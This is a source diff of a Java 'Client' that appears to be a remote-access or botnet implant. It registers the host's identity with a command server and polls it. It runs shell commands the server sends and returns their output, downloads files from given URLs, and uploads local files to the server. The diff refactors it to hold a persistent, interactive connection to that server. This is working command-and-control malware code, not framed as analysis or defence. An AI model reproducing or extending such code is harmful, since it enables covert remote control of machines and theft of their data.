@@ -6,10 +6,8 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
-import java.net.Socket;
 import java.net.SocketException;
 import java.net.URL;
 import java.net.URLConnection;
@@ -18,6 +16,7 @@ import java.util.Enumeration;
 import java.util.HashMap;
 
 import tools.Command;
+import tools.Connection;
 import tools.ParsedCommand;
 
 /**
@@ -38,16 +37,21 @@ public class Client extends Thread {
 	
 	private HashMap<String, Command> commands;
 	
+	// Current connection
+	private Connection curConn;
+	
+	private boolean connected = false;
 	private int id;
 	
 	public Client() {
 		commands = new HashMap<String, Command>();
 		
-		commands.put("PONG", new Command(){
+		commands.put("DONE", new Command(){
 
 			@Override
 			public String exec(ParsedCommand pCmd) {
-				// TODO: log pong
+				connected = false;
+				curConn = null;
 				return null;
 			}
 			
@@ -68,7 +72,7 @@ public class Client extends Thread {
 					while ((line = reader.readLine()) != null) {
 						output.append(line + "\n");
 					}
-					sendAsync("OUT " + id, output.toString());
+					send("OUT " + id, output.toString().getBytes());
 					
 				} catch (IOException | InterruptedException e) {
 					// TODO Auto-generated catch block
@@ -87,7 +91,7 @@ public class Client extends Thread {
 	
 				try {
 					download(pCmd.args[0], pCmd.args[1]);
-					sendAsync("OUT File correctly downloaded.");
+					send("OUT", "File correctly downloaded.".getBytes());
 					
 				} catch (IOException e) {
 					// TODO Auto-generated catch block
@@ -120,7 +124,7 @@ public class Client extends Thread {
 						payload[i] = tmp.get(i);
 					
 					// Sending request
-					sendAsync("UPLD " + pCmd.args[1], payload);
+					send("UPLD " + pCmd.args[1], payload);
 					
 				} catch (IOException e) {
 					// TODO Auto-generated catch block
@@ -139,6 +143,7 @@ public class Client extends Thread {
 		
 		try {
 			id = Integer.parseInt(send("GETID " + getIdentity()));
+			send("DONE");
 		} catch (NumberFormatException | SocketException e1) {
 			// TODO Auto-generated catch block
 			e1.printStackTrace();
@@ -146,17 +151,24 @@ public class Client extends Thread {
 		
 		while (true) {
 			
-			String response = send("PING " + id, new byte[] {});
-			ParsedCommand pCmd = new ParsedCommand(response);
-			if (commands.containsKey(pCmd.cmd))
-				commands.get(pCmd.cmd).exec(pCmd);
+			if (connected) {
+				listen();
+			} else {
+				
+				try {
+					Thread.sleep(REFRESH_COOLDOWN);
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				
+				String response = send("PING " + id, new byte[] {});
+				ParsedCommand pCmd = new ParsedCommand(response);
+				if (commands.containsKey(pCmd.cmd))
+					commands.get(pCmd.cmd).exec(pCmd);
 
-			try {
-				Thread.sleep(REFRESH_COOLDOWN);
-			} catch (InterruptedException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
 			}
+			
 		}
 	}
 	
@@ -209,35 +221,41 @@ public class Client extends Thread {
 		
 	}
 	
-	private String send(String request, byte[] payload) {
-		Socket socket;
+	private void listen() {
 		
-		byte[] CRLF = new byte[] {13, 10};
+		if (curConn == null) {
+			connected = false;
+			return;
+		}
+		
+		String request = curConn.readResponse();
+		
+		ParsedCommand pCmd = new ParsedCommand(request.toString());
+		if (commands.containsKey(pCmd.cmd))
+			commands.get(pCmd.cmd).exec(pCmd);
+	}
+	
+	private String send(String request, byte[] payload) {
 		
 		try {
-			socket = new Socket(SERVER_URL, SERVER_PORT);
-		
-			OutputStream out = socket.getOutputStream();
-			InputStream in = socket.getInputStream();
 			
-			out.write(Integer.toString(payload.length).getBytes());
-			out.write(CRLF);
-			out.write(request.getBytes());
-			out.write(CRLF);
-			out.write(payload);
+			if (curConn == null)
+				curConn = new Connection(SERVER_URL, SERVER_PORT);
 			
-			out.flush();
+			curConn.write(request, payload);
 			
-			StringBuilder line = new StringBuilder();
-			int c;
-			while ((c = in.read()) != -1)
-				line.append((char) c);
+			// Blocks until response
+			String response = curConn.readResponse();
 			
-			out.close();
-			in.close();
-			socket.close();
+			connected = false;
+			if (response.toString().startsWith("DONE")) {
+				curConn.close();
+				curConn = null;
+			} else {
+				connected = true;
+			}
 			
-			return line.toString();
+			return response.toString();
 		
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
@@ -251,44 +269,6 @@ public class Client extends Thread {
 		
 		return send(request, new byte[] {});
 		
-	}
-	
-	private void sendAsync(String request, byte[] payload, Callback callback) {
-		
-		new Thread(new Runnable(){
-
-			@Override
-			public void run() {
-				String response = send(request, payload);
-				callback.run(response);
-			}
-			
-		}).start();
-		
-	}
-	
-	private void sendAsync(String request, byte[] payload) {
-		sendAsync(request, payload, new Callback(){
-
-			@Override
-			public void run(String response) {
-				// TODO Auto-generated method stub
-				
-			}
-			
-		});
-	}
-	
-	private void sendAsync(String request, String payload) {
-		sendAsync(request, payload.getBytes());
-	}
-	
-	private void sendAsync(String request) {
-		sendAsync(request, "");
-	}
-	
-	private interface Callback {
-		public void run(String response);
 	}
 	
 	public static void download(String fileURL, String fileName)
